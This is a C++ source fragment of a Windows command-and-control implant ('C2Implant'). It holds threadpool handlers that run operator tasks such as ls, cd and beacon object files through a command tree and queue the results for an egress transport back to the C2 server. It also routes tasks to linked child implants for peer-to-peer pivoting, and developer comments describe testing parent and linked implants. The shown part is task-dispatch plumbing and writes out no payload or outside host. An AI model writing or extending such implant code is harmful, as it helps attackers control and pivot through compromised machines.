// Thread-safe response queue for background workers
// Might be a good idea to toss into its own file
std::queue<nlohmann::json> response_queue;
std::mutex queue_mutex;

// Signals the main loop when a background task completes
HANDLE h_data_ready_event = NULL;



// ======================================================================================
// 1. THREAD POOL WORKER LOGIC/ASYNC HANDLERS
// ======================================================================================

//pass to child
//Handler for ASYNC routing of data to child implants.
VOID CALLBACK ChildRoutingHandler(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work) {
    nlohmann::json* task_ptr = static_cast<nlohmann::json*>(Context);
    nlohmann::json task_data = *task_ptr;
    nlohmann::json result = route_task_to_child_implant(task_data);

    // If the child actually gave us a response, queue it up for the parent C2 to send back
    if (!result.is_null()) {
        std::lock_guard<std::mutex> lock(queue_mutex);
        response_queue.push(result);
    }

    SetEvent(h_data_ready_event);
    delete task_ptr;
    CloseThreadpoolWork(Work);
}
void C2Implant::dispatch_to_child_router(const nlohmann::json& task) {
    nlohmann::json* task_context = new nlohmann::json(task);
    //yeet into OS threadpool
    PTP_WORK work_item = CreateThreadpoolWork(ChildRoutingHandler, task_context, NULL);
    if (work_item) {
        SubmitThreadpoolWork(work_item);
    }
    else {
        delete task_context;
    }
}

//delme - next steps, copy this project, make one of these parent (egress), one of these linked, and test it out.


//local task
VOID CALLBACK TaskHandler(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work) {
    // 1. Recover task data from the heap
    nlohmann::json* task_ptr = static_cast<nlohmann::json*>(Context);
    nlohmann::json task_data = *task_ptr;

    // 2. Execute the actual command (ls, cd, bof, etc)
    nlohmann::json result = command_tree(task_data);

    // 3. Ensure the response is linked to the original tasking
    result["task_uuid"] = task_data["task_uuid"];

    // 4. Safely queue the result for the egress transport
    {
        std::lock_guard<std::mutex> lock(queue_mutex);
        response_queue.push(result);
    }

    // 5. Wake up the main cycle() loop to send the response
    SetEvent(h_data_ready_event);

    // 6. Cleanup
    delete task_ptr;
    CloseThreadpoolWork(Work);
}

void C2Implant::dispatch_to_threadpool(const nlohmann::json& task) {
    nlohmann::json* task_context = new nlohmann::json(task);
    //yeet into OS threadpool
    PTP_WORK work_item = CreateThreadpoolWork(TaskHandler, task_context, NULL);
    if (work_item) {
        SubmitThreadpoolWork(work_item);
    }
    else {
        delete task_context;
    }
}

